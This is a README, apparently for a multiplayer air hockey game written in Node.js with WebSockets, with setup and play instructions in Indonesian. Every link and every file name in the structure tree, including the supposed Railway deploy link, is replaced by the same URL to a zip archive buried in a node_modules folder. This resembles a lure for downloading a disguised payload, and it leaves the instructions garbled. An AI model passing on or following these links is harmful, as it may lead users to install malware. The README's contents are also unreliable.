# 🏒 Air Hockey - Split Screen Multiplayer

Game air hockey real-time dengan room system untuk multiplayer.

## 🚀 Quick Start

### Lokal
```bash
cd server
npm install
npm start
```

Buka `http://localhost:8080`:
1. Klik **Create Room** → dapat room code (contoh: `ABCD`)
2. Share room code ke teman
3. Teman buka URL dan masukkan room code → **Join**
4. Game dimulai otomatis!

### Deploy ke Railway
1. Push ke GitHub
2. Buat project baru di [https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip](https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip)
3. Connect repository
4. Deploy! ✨

## 🎮 Cara Bermain

| Aksi | Cara |
|------|------|
| Kontrol paddle | Gerakkan mouse/finger |
| Mencetak gol | Dorong puck ke gawang lawan |
| Menang | First to **7 goals** |

## 📁 Struktur

```
part-of-world/
├── server/
│   ├── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip
│   └── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip       # Game server + WebSocket
├── client/
│   ├── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip      # Lobby + Game UI
│   ├── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip
│   └── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip          # Client logic
└── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip
```

## 🔧 Environment

```bash
PORT=8080  # Railway sets this automatically
```
